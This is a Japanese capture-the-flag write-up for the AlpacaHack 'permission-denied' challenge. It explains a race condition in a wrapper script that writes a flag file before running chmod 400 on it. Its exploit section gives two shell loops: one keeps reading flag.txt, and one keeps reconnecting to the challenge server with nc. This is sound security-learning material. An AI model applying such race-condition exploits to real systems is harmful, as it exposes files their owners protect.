# permission-denied writeup
<https://alpacahack.com/daily/challenges/permission-denied>

## 1. 概要
本問題はコンテナ接続時に実行されるラッパースクリプトの挙動における競合状態を突いてフラグを取得する問題です．

## 2. 問題の分析

### ファイル構成
配布されたアーカイブには以下のファイルが含まれています．
- `chal.sh`: 接続時に実行されるスクリプト
- `Dockerfile`: コンテナのビルド設定
- `compose.yaml`: Docker Composeの設定

### ソースコードの確認
`chal.sh`の内容を確認すると以下のようになっています．

```bash
echo Alpaca{REDACTED} > flag.txt
chmod 400 flag.txt
runuser -u nobody -- sh
rm flag.txt
```

`Dockerfile`では `socat`を用いてTCPの1337ポートで接続を受け付けています．
接続が発生すると `bash chal.sh`が実行される仕組みです．

## 3. 脆弱性と攻略方針

### 脆弱性
`chal.sh`ではフラグを書き込んだ直後に `chmod 400`でパーミッションを変更しています．
しかし，ファイルが作成された瞬間から `chmod`が実行されるまでのごくわずかな時間においてフラグファイルが誰でも読める状態になります．
これが本問題の脆弱性（競合状態）です．

### 攻略方針：
2つの接続を同時に行うことでこの隙を突きます．
1つの接続では `nobody`権限のシェルからひたすら `flag.txt`を読み取る無限ループを実行します．
もう1つの接続では新規接続を何度も繰り返します．
ファイルの作成と権限変更を強制的に引き起こすことで読み取りのタイミングを合わせます．

## 4. エクスプロイトコード
まず1つ目のターミナルで問題サーバーに接続して以下のコマンドを実行します．

```bash
while true; do cat flag.txt 2>/dev/null; done
```

次に2つ目のターミナルを開き，以下のコマンドで接続を繰り返します．

```bash
while true; do echo "exit" | nc 34.170.146.252 56332; done
```

これらを実行すると1つ目のターミナルにフラグが出力されます．